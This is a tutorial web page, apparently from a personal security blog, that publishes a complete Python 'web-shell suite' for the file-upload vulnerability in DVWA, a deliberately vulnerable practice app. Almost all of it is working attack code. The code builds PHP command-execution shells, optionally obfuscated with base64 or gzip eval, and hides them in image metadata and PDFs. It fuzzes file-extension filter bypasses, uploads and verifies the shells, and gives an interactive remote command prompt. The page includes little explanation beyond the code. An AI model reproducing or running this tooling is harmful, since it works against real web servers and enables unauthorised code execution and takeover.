---
layout: page
title: DVWA Web Shells
published: 2025-09-27
description: "Web-Shell Suite designed for DVWA."
permalink: /tutorials/python/dvwa
category: python
subcategory: dvwa
---
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' https:; script-src 'self'; style-src 'self' 'unsafe-inline';">
<meta http-equiv="X-Content-Type-Options" content="nosniff">
<meta http-equiv="Strict-Transport-Security" content="max-age=31536000; includeSubDomains; preload">
<meta name="referrer" content="no-referrer">
<meta http-equiv="X-Frame-Options" content="DENY">
<meta http-equiv="Permissions-Policy" content="geolocation=(), microphone=(), camera=()">
<meta http-equiv="X-XSS-Protection" content="1; mode=block">
<meta http-equiv="Access-Control-Allow-Origin" content="*">
<meta http-equiv="Cross-Origin-Embedder-Policy" content="require-corp">
<meta http-equiv="Cross-Origin-Opener-Policy" content="same-origin">
<meta http-equiv="Cross-Origin-Resource-Policy" content="same-origin">
<meta http-equiv="Expect-CT" content="max-age=86400, enforce">
<link rel="icon" href="/favicon.png" type="image/png">
<link rel="stylesheet" href="{{ 'css/main.css' | relative_url }}">
<script src="{{ 'assets/js/copy-to-clipboard.js' | relative_url }}"></script>


---

<div class="post-meta">
  <p>Published: {{ page.published | date: "%a, %b %d, %y" }}</p>
  <p>{{ page.description }}</p>
</div>


---

<h1>DVWA Web-Shell Suite</h1>


---

- Project layout <br>
        webshell_suite.py <br>
        shells.txt <br>
        /payloads <br>
        /utils <br>
            - banner.py <br>
            - colors.py <br>
        

`webshell_suite.py`

---

```python
#!/usr/bin/env python3
# webshell_suite.py
# aMiscreant
import base64
import datetime
import gzip
import os
from io import BytesIO
from urllib.parse import urlencode
from urllib.parse import urlparse, urlunparse

import requests

from utils.banner import print_banner
from utils.colors import green, red, yellow, cyan

# Default Payload Lists
FUZZ_LIST = [
    'php', 'php3', 'php4', 'php5', 'phtml', 'phar',
    'jpg.php', 'jpeg.php', 'png.php', 'gif.php', 'pdf.php',
    'php.', 'php.jpg', 'php.jpeg', 'php.png', 'php%2Ephp',
    'p.phphp', 'php%00.jpg', 'php%0d%0a.jpg', 'PHP', 'pHp',
    'php/', 'php//', 'php\\', 'php#', '..php'
]

# Default Fuzz Patterns
FUZZ_PATTERNS = {
    'soft': lambda: [f"shell.{ext}" for ext in FUZZ_LIST],
    'medium': lambda: [f"shell.{a}.{b}" for a in FUZZ_LIST for b in FUZZ_LIST],
    'hard': lambda: [f"{a}.{b}.{c}" for a in FUZZ_LIST for b in FUZZ_LIST for c in FUZZ_LIST],
}

SHELLS_FILE = "shells.txt"

def save_shells(shells):
    with open(SHELLS_FILE, "a") as f:
        for s in shells:
            f.write(s + "\n")

def load_shells():
    if not os.path.exists(SHELLS_FILE):
        return []
    with open(SHELLS_FILE, "r") as f:
        return [line.strip() for line in f if line.strip()]

def clean_payloads_dir():
    payload_dir = "payloads"
    if not os.path.exists(payload_dir):
        print(yellow("[*] Payloads directory does not exist. Nothing to clean."))
        return
    confirm = input(f"Are you sure you want to delete all payloads in {payload_dir}? [y/N]: ").strip().lower()
    if confirm == "y":
        for f in os.listdir(payload_dir):
            try:
                os.remove(os.path.join(payload_dir, f))
            except Exception as e:
                print(f"{red('[!]')} Failed to delete {f}: {e}")
        print(green("[+] Payloads cleaned."))
    else:
        print(yellow("[*] Cleanup aborted."))

def select_and_connect(shells):
    if not shells:
        print(red("[!] No shells to connect to."))
        return
    for i, url in enumerate(shells, 1):
        print(f"{i}. {url}")
    while True:
        try:
            choice = int(input("Select shell to connect to (number): "))
            if 1 <= choice <= len(shells):
                session = requests.Session()
                interactive_shell(shells[choice - 1], session, {})
                break
            else:
                print("Invalid choice.")
        except ValueError:
            print("Please enter a valid number.")

def strip_cmd_param(url):
    parsed = urlparse(url)
    return urlunparse(parsed._replace(query=""))

def timestamp():
    return datetime.datetime.now().strftime("[%H:%M:%S]")

def prompt_user_config():
    target = input("Target base URL (e.g. http://192.168.1.10/DVWA): ").strip()
    session_id = input("PHPSESSID (press enter to use default/insecure): ").strip() or "insecure-session"
    password = input("Set shell password (leave blank for none): ").strip()
    obfuscate = input("Obfuscate payload? [none/base64/gzip]: ").strip().lower() or "none"
    fuzz_level = input("Fuzz level [soft, medium, hard]: ").strip().lower() or "soft"
    return target, {"PHPSESSID": session_id, "security": "low"}, fuzz_level, password, obfuscate

def generate_payload(payload_type, dest_file, password=None, obfuscate=None):
    # Raw command logic
    if password:
        raw_code = f"if ($_GET['pass'] === '{password}') {{ system($_GET['cmd']); }}"
    else:
        raw_code = "system($_GET['cmd']);"

    php_code = f"<?php {raw_code} ?>"

    if obfuscate == "base64":
        encoded = base64.b64encode(raw_code.encode()).decode()
        php_code = f"<?php eval(base64_decode('{encoded}')); ?>"
    elif obfuscate == "gzip":
        buf = BytesIO()
        with gzip.GzipFile(fileobj=buf, mode='wb') as gz:
            gz.write(raw_code.encode())
        gzipped_b64 = base64.b64encode(buf.getvalue()).decode()
        php_code = f"<?php eval(gzinflate(gzdecode(base64_decode('{gzipped_b64}')))); ?>"

    # Save payload
    if payload_type == 'image':
        os.system(f"convert -size 32x32 xc:white {dest_file}")
        os.system(f"exiftool -Comment='{php_code}' -overwrite_original {dest_file}")
    elif payload_type == 'pdf':
        with open(dest_file, "wb") as f:
            f.write(b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n")
            f.write(b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n")
            f.write(b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] ")
            f.write(b"/Contents 4 0 R >>\nendobj\n4 0 obj\n<< /Length 55 >>\nstream\n")
            f.write(php_code.encode())
            f.write(b"\nendstream\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF")
    else:
        with open(dest_file, "w") as f:
            f.write(php_code)

def upload_fuzzed_shells(target, cookie, fuzz_level, password, obfuscate):
    upload_url = f"{target}/vulnerabilities/upload/"
    shell_paths = FUZZ_PATTERNS.get(fuzz_level, FUZZ_PATTERNS['soft'])()
    print(f"{yellow(timestamp())} Fuzzing with {len(shell_paths)} shell variations...")

    session = requests.Session()
    active_shells = []

    for fname in shell_paths:
        try:
            payload_ext = fname.split('.')[-1]
            payload_path = os.path.join("payloads", fname)
            os.makedirs(os.path.dirname(payload_path), exist_ok=True)
            generate_payload(
                'pdf' if 'pdf' in payload_ext else 'image' if payload_ext in ['jpg', 'jpeg', 'png', 'gif'] else 'php',
                payload_path,
                password,
                obfuscate
            )

            files = {
                "MAX_FILE_SIZE": (None, "100000"),
                "uploaded": (fname, open(payload_path, "rb")),
                "Upload": (None, "Upload")
            }
            session.post(upload_url, cookies=cookie, files=files)
            shell_url = f"{target}/hackable/uploads/{fname}"
            if password:
                test_url = f"{shell_url}?pass={password}&cmd=id"
            else:
                test_url = f"{shell_url}?cmd=id"

            res = session.get(test_url, cookies=cookie)
            if "uid=" in res.text:
                print(f"{green('[+]')} Shell alive: {test_url}")
                active_shells.append(test_url)
            else:
                print(f"{red('[-]')} Shell dead: {test_url}")
        except Exception as e:
            print(f"{red('[!]')} Error uploading {fname}: {e}")
    return active_shells

def interactive_shell(shell_url, session, cookie):
    print(f"\n{green('[+]')} Connected to {shell_url}\n")

    parsed = urlparse(shell_url)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    params = dict()
    if "pass=" in parsed.query:
        for q in parsed.query.split("&"):
            k, v = q.split("=")
            params[k] = v

    while True:
        cmd = input(f"{cyan('$execute > ')}").strip()
        if cmd.lower() in ["exit", "quit"]:
            print(f"{yellow('[*]')} Exiting shell...\n")
            break
        if not cmd:
            continue
        try:
            params['cmd'] = cmd
            res = session.get(base_url + "?" + urlencode(params), cookies=cookie)
            print(res.text.strip())
        except Exception as e:
            print(f"{red('[!]')} Request failed: {e}")

def main_menu():
    os.system("clear")
    print_banner()
    while True:
        print(f"""{cyan('''
Main Menu:
  1. Launch new fuzz session
  2. View and connect to active shells
  3. Load saved shells
  4. Clean payloads directory
  5. Exit
''')}""")
        choice = input("Choose an option: ").strip()
        if choice == "1":
            target, cookie, fuzz_level, password, obfuscate = prompt_user_config()
            session = requests.Session()
            shells = upload_fuzzed_shells(target, cookie, fuzz_level, password, obfuscate)
            if shells:
                save_shells(shells)
        elif choice == "2":
            shells = load_shells()
            if not shells:
                print(red("[!] No saved shells found. Launch a fuzz session first."))
                continue
            select_and_connect(shells)
        elif choice == "3":
            shells = load_shells()
            select_and_connect(shells)
        elif choice == "4":
            clean_payloads_dir()
        elif choice == "5":
            print(yellow("[*] Goodbye!"))
            break
        else:
            print("Invalid option.")

def main():
    main_menu()

if __name__ == "__main__":
    main()

```

---

<p>banner.py</p>

```python
# utils/banner.py

def print_banner():
    banner = r"""


 __      __      ___.     _________.__           .__  .__    _________     .__  __          
/  \    /  \ ____\_ |__  /   _____/|  |__   ____ |  | |  |  /   _____/__ __|__|/  |_  ____  
\   \/\/   // __ \| __ \ \_____  \ |  |  \_/ __ \|  | |  |  \_____  \|  |  \  \   __\/ __ \ 
 \        /\  ___/| \_\ \/        \|   Y  \  ___/|  |_|  |__/        \  |  /  ||  | \  ___/ 
  \__/\  /  \___  >___  /_______  /|___|  /\___  >____/____/_______  /____/|__||__|  \___  >
       \/       \/    \/        \/      \/     \/                  \/                    \/ 


                                WebShellSuite by aMiscreant 💀
    """
    print(f"\033[92m{banner}\033[0m")
```

---

<p>colors.py</p>

```python
# utils/colors.py

def red(text): return f"\033[91m{text}\033[0m"
def green(text): return f"\033[92m{text}\033[0m"
def yellow(text): return f"\033[93m{text}\033[0m"
def cyan(text): return f"\033[96m{text}\033[0m"
```

---

<style>
  footer {
    display: none;
  }
</style>